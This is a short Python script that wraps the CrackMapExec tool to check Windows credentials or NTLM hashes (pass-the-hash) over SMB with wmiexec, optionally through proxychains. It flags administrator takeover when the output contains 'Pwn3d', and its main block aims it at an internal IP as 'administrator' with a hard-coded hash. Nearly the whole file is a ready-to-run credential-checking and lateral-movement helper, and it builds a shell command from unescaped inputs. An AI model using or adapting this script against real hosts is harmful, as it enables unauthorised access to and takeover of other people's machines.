import re
import subprocess

pipe = subprocess.PIPE

def info2str(o):
    s = "-u '%s'" % o['username']
    if o.get('password'):
        s += " -p '%s'" % o['password']
    elif o.get('ntlm'):
        s += ' -H %s' % o['ntlm']
    else:
        raise Exception("No password provided")

    if o.get('domain') != '.':
        s += ' -d %s' % o['domain']
    else:
        s += ' --local-auth'

    return s

def strip_color(s):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', s)

def run(target, username, password=None, ntlm=None, domain=None, useProxy=False, module='smb'):
    if password is None and ntlm is None:
        exit(1)
    domain = domain or '.'
    binary = 'proxychains cme' if useProxy else 'cme'
    binary += ' ' + module
    auth_info = info2str(dict(username=username, password=password, ntlm=ntlm, domain=domain))
    cmd = '%s %s --exec-method wmiexec %s' % (binary, auth_info, target)
    p = subprocess.Popen(cmd, shell=True, stderr=pipe, stdout=pipe, stdin=pipe)
    out, _ = p.communicate()
    out = strip_color(out.decode())
    #print(out)
    if 'Pwn3d' in out:
        return 2
    elif '[+]' in out:
        return 1
    return 0


if __name__ == '__main__':
    run('192.168.134.100', 'administrator', ntlm='2892d26cdf84d7a70e2eb3b9f05c425e')
